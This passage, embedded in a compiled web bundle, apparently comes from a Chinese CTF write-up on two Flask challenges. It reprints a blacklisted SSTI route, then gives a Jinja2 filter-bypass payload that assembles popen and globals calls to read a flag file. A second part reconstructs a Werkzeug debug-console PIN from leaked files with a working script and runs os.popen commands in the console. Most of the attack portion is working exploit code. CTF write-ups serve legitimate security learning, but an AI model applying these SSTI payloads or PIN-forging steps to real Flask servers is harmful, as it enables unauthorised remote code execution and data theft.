render_template('index.html')\r\n\r\n@app.route('/secr3ttt', methods=['GET', 'POST'])\r\ndef secr3t():\r\n    klf = request.args.get('klf', '')\r\n    template = f'''\r\n       <html>\r\n           <body>\r\n               <h1>\u522b\u627e\u4e86\uff0c\u8fd9\u6b21\u4f60\u80af\u5b9a\u662fklf</h1>     \r\n           </body>\r\n           <img src=\"https://image-obsidian-1317327960.cos.ap-chengdu.myqcloud.com/obisidian-blog/0071088CAC91D2C42C4D31053A7E8D2B731D69.jpg\" alt=\"g\">\r\n            <h1>%s</h1>   \r\n       </html>\r\n       \x3c!--klf?--\x3e\r\n       \x3c!-- \u522b\u60f3\u8981flag\uff1fklf --\x3e\r\n\r\n       '''\r\n    bl = ['_', '\\\\', '\\'', '\"', 'request', \"+\", 'class', 'init', 'arg', 'config', 'app', 'self', 'cd', 'chr',\r\n      'request', 'url', 'builtins', 'globals', 'base', 'pop', 'import', 'popen', 'getitem', 'subclasses', '/',\r\n      'flashed', 'os', 'open', 'read', 'count', '*', '38', '124', '47', '59', '99', '100', 'cat', '~',\r\n      ':', 'not', '0', '-', 'ord', '37', '94', '96', '[',']','index','length']#'43', '45',\r\n    for i in bl:\r\n        if i in klf:\r\n            return render_template('klf.html')\r\n\r\n    a = render_template_string(template % klf)\r\n    if \"{\" in a:\r\n        return  a + render_template('win.html')\r\n\r\n    return a\r\n\r\n\r\n\r\n@app.route('/robots.txt', methods=['GET'])\r\ndef robots():\r\n    return send_from_directory(os.path.join(app.root_path, 'static'),\r\n                               'robots.txt', mimetype='text/plain')\r\n\r\n\r\n\r\n\r\nif __name__ == '__main__':\r\n    app.run(host='0.0.0.0', port=7889, debug=False)\n"})}),"\n",(0,t.jsx)(e.p,{children:"\u8fc7\u6ee4\u7684\u592a\u591a\u4e86\uff0c\u76f4\u63a5\u7528\u8fc7\u6ee4\u5668"}),"\n",(0,t.jsx)(e.p,{children:"payload"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-python",children:"{% set po=dict(po=1,p=2)|join()%}\r\n{% set a=(()|select|string|list)|attr(po)(24)%} \r\n{% set oo=dict(o=a,s=a)|join()%}\r\n{% set p=dict(po=a,pen=a)|join()%}\r\n{% set ch=dict(ch=a,r=a)|join()%}\r\n{% set in=(a,a,dict(in=a,it=a)|join,a,a)|join()%}\r\n{% set gl=(a,a,dict(glob=a,als=q)|join,a,a)|join()%}\r\n{% set ge=(a,a,dict(geti=a,tem=a)|join,a,a)|join()%}\r\n{% set bu=(a,a,dict(bui=a,ltins=a)|join,a,a)|join()%}\r\n{% set im=(a,a,dict(imp=a,ort=a)|join,a,a)|join()%}\r\n{% set cl=(a,a,dict(cla=a,ss=a)|join,a,a)|join()%}\r\n{% set su=(a,a,dict(subcla=a,sses=a)|join,a,a)|join()%}\r\n{% set ba=(a,a,dict(ba=a,se=a)|join,a,a)|join()%}\r\n{% set x=jay17|attr(cl)|attr(ba)|attr(su)()%}\r\n{% set chhr=()|attr(cl)|attr(ba)|attr(su)()|attr(ge)(117)|attr(in)|attr(gl)|attr(ge)(bu)|attr(ge)(ch)%}\r\n{% set pp=()|attr(cl)|attr(ba)|attr(su)()|attr(ge)(117)|attr(in)|attr(gl)|attr(ge)(p)%}\r\n{% set re=dict(re=a,ad=a)|join()%}\r\n{% set en=dict(en=a,v=a)|join()%}\r\n{% set fl=dict(fl=a,ag=a)|join()%}\r\n{% set ta=dict(ta=a,c=a)|join()%}\r\n{% set kgxg=(chhr(3\uff12),chhr(4\uff17))|join()%}\r\n{% set tf=(ta,kgxg,fl)|join()%}\r\n{% set ll=dict(l=a,s=a)|join()%}\r\n{% set lll=(ll,kgxg)|join()%}\r\n{% set la=(ll,kgxg,dict(ap=a,p=a)|join)|join()%}\r\n{% set ha=dict(ha=a,hahaha=a)|join()%}\r\n{% set th=(ta,chhr(3\uff12),ha)|join()%}\r\n{% set ym=(dict(ca=a,t=a)|join,chhr(3\uff12),dict(ap=a,p=a)|join,chhr(4\uff16),dict(p=a,y=a)|join)|join()%}\r\n{% set six=(ta,kgxg,dict(ap=a,p=a)|join,chhr(4\uff17),dict(fl4gfl4=a,gfl4g=a)|join)|join()%}\r\n{% set cmd=pp(six)|attr(re)()%}\r\n{{cmd}}\n"})}),"\n",(0,t.jsx)(e.p,{children:"\u670d\u5566\uff0c\u8fc7\u6ee4\u7684\u592a\u591a\u4e86\uff0c\u5199\u4e0d\u51fa\u6765"}),"\n",(0,t.jsx)(e.h2,{id:"polar-flask_pin",children:"polar flask_pin"}),"\n",(0,t.jsx)(e.p,{children:"\u6253\u5f00\u9898\u76ee\uff0c\u53d1\u73b0\u62a5\u9519\uff0c\u5f97\u5230\u4e00\u90e8\u5206\u6e90\u7801"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-python",children:"from flask import Flask, request\r\napp = Flask(__name__)\r\n \r\n@app.route(\"/\")\r\ndef hello():\r\n    return Hello['a']\r\n \r\n@app.route(\"/file\")\r\ndef file():\r\n    filename = request.args.get('filename')\r\n    try:\n"})}),"\n",(0,t.jsx)(e.p,{children:"\u8bbf\u95eefile\u8def\u7531\uff0c\u6709\u4e2afilename\u53c2\u6570\u53ef\u4ee5\u8fdb\u884c\u6587\u4ef6\u8bfb\u53d6"}),"\n",(0,t.jsx)(e.p,{children:"\u63a5\u7740\u8bbf\u95eeconsole\u53d1\u73b0\u9700\u8981\u8f93\u5165PIN\u7801\uff0c\u90a3\u5c31\u662f\u8bfb\u53d6\u6587\u4ef6\u7136\u540e\u8fdb\u884cRCE\u4e86"}),"\n",(0,t.jsxs)(e.blockquote,{children:["\n",(0,t.jsx)(e.p,{children:"\u62fc\u51d1\u51faPIN\u7684\u6240\u6709\u8ba1\u7b97\u8981\u7d20\uff08\u516d\u4e2a\uff09\uff0c\u4ece\u800c\u81ea\u5df1\u8ba1\u7b97\u51faPIN\u7801"}),"\n",(0,t.jsx)(e.p,{children:"1.username = root\r\n\u901a\u8fc7getpass.getuser()\u8bfb\u53d6\u6216\u8005\u901a\u8fc7\u6587\u4ef6\u8bfb\u53d6/etc/passwd"}),"\n",(0,t.jsx)(e.p,{children:"2.modname = flask.app\r\n\u901a\u8fc7getattr(mod,\u201cfile\u201d,None)\u8bfb\u53d6\uff0c\u9ed8\u8ba4\u503c\u4e3aflask.app"}),"\n",(0,t.jsx)(e.p,{children:"3.appname = Flask\r\n\u901a\u8fc7getattr(app,\u201cname\u201d,type(app).name)\u8bfb\u53d6\uff0c\u9ed8\u8ba4\u503c\u4e3aFlask"}),"\n",(0,t.jsx)(e.p,{children:"4.moddir = /usr/local/lib/python3.5/site-packages/flask/app.py\r\nflask\u5e93\u4e0bapp.py\u7684\u7edd\u5bf9\u8def\u5f84\u3001\u5f53\u524d\u7f51\u7edc\u7684mac\u5730\u5740\u7684\u5341\u8fdb\u5236\u6570\uff0c\u901a\u8fc7getattr(mod,\u201cfile\u201d,None)\u8bfb\u53d6\u5b9e\u9645\u5e94\u7528\u4e2d\u901a\u8fc7\u62a5\u9519\u8bfb\u53d6,\u5982\u4f20\u53c2\u7684\u65f6\u5019\u7ed9\u4e2a\u4e0d\u5b58\u5728\u7684\u53d8\u91cf"}),"\n",(0,t.jsx)(e.p,{children:"5.uuidnode = 2485376933521\r\nmac\u5730\u5740\u7684\u5341\u8fdb\u5236,\u901a\u8fc7uuid.getnode()\u8bfb\u53d6\uff0c\u901a\u8fc7\u6587\u4ef6/sys/class/net/eth0/address\u5f97\u523016\u8fdb\u5236\u7ed3\u679c\uff0c\u8f6c\u5316\u4e3a10\u8fdb\u5236\u8fdb\u884c\u8ba1\u7b97"}),"\n",(0,t.jsx)(e.p,{children:"6.machine_id = c31eea55a29431535ff01de94bdcf5cf0daba752a54681af6e8b216e32f7a76a0118dd55b8fe82906d9a9a1b4bd569bf\r\n\u673a\u5668\u7801\uff0c\u6bcf\u4e00\u4e2a\u673a\u5668\u90fd\u4f1a\u6709\u81ea\u5df2\u552f\u4e00\u7684id\uff0c\uff08Linux\u4e0b\uff09machine_id\u7531\u4e09\u4e2a\u5408\u5e76(docker\u5c312.3\u6216\u80051.3)\uff1a1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup(\u7b2c\u4e00\u884c\u7684/docker/\u5b57\u7b26\u4e32\u540e\u9762\u7684\u5185\u5bb9)windows\u8bfb\u53d6\u6ce8\u518c\u8868\u4e2d\u7684HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography\r\n\u4e00\u822c\u751f\u6210pin\u7801\u4e0d\u5bf9\u5c31\u662f\u8fd9\u9519\u4e86\u3002"}),"\n"]}),"\n",(0,t.jsxs)(e.ol,{children:["\n",(0,t.jsx)(e.li,{children:"\u83b7\u53d6\u7528\u6237\u540d\uff0c\u8fd9\u91cc\u5c31\u662froot\uff0c\u770b/etc/passwd\u6587\u4ef6"}),"\n",(0,t.jsx)(e.li,{children:"modname\u9ed8\u8ba4\u503c\u4e3aflask.app"}),"\n",(0,t.jsx)(e.li,{children:"appname\u9ed8\u8ba4\u503c\u4e3aFlask"}),"\n",(0,t.jsx)(e.li,{children:"moddir flask\u5e93\u4e0bapp.py\u7684\u7edd\u5bf9\u8def\u5f84"}),"\n",(0,t.jsx)(e.li,{children:"mac\u5730\u5740\u7684\u5341\u8fdb\u5236"}),"\n",(0,t.jsx)(e.li,{children:"machine_id\u7531\u4fe9\u4e2a\u6587\u4ef6\u7ec4\u5408\u800c\u6210"}),"\n"]}),"\n",(0,t.jsx)(e.p,{children:"\u8ba1\u7b97PIN\u7801\uff0cpython3.6\u4ee5\u4e0b\u662fMD5\u52a0\u5bc6\uff0c\u4ee5\u4e0a\u662fsha1\u52a0\u5bc6"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-python",children:"#MD5\r\nimport hashlib\r\nfrom itertools import chain\r\nprobably_public_bits = [\r\n    'root',# username\r\n    'flask.app',# modname\r\n    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))\r\n    '/usr/local/lib/python3.5/site-packages/flask/app.py'# getattr(mod, '__file__', None),\r\n]\r\n\r\nprivate_bits = [\r\n    '2485376914036',\r\n    'c31eea55a29431535ff01de94bdcf5cfea163ddc9c2c8c79c224e150fab1df832278879c09689e3e6df72197f54ee9f4'\r\n]\r\n\r\nh = hashlib.md5()\r\nfor bit in chain(probably_public_bits, private_bits):\r\n    if not bit:\r\n        continue\r\n    if isinstance(bit, str):\r\n        bit = bit.encode('utf-8')\r\n    h.update(bit)\r\nh.update(b'cookiesalt')\r\n\r\ncookie_name = '__wzd' + h.hexdigest()[:20]\r\n\r\nnum = None\r\nif num is None:\r\n   h.update(b'pinsalt')\r\n   num = ('%09d' % int(h.hexdigest(), 16))[:9]\r\n\r\nrv =None\r\nif rv is None:\r\n   for group_size in 5, 4, 3:\r\n       if len(num) % group_size == 0:\r\n          rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')\r\n                      for x in range(0, len(num), group_size))\r\n          break\r\n       else:\r\n          rv = num\r\n\r\nprint(rv)\n"})}),"\n",(0,t.jsx)(e.p,{children:"\u8fdb\u5165\u63a7\u5236\u53f0"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:"import os\r\nos.popen('ls /').read()\r\nos.popen('cat /flaggggg').read()\n"})}),"\n",(0,t.jsx)(e.p,{children:"\u5f97\u5230flag"})]})}function p(n={}){const{wrapper:e}={...(0,i.R)(),...n.components};return e?(0,t.jsx)(e,{...n,children:(0,t.jsx)(d,{...n})}):d(n)}},8453:(n,e,r)=>{r.d(e,{R:()=>a,x:()=>l});var s=r(6540);const t={},i=s.createContext(t);function a(n){const e=s.useContext(i);return s.useMemo((function(){return"function"==typeof n?n(e):{...e,...n}}),[e,n])}function l(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(t):n.components||t:a(n.components),s.createElement(i.Provider,{value:e},n.children)}}}]);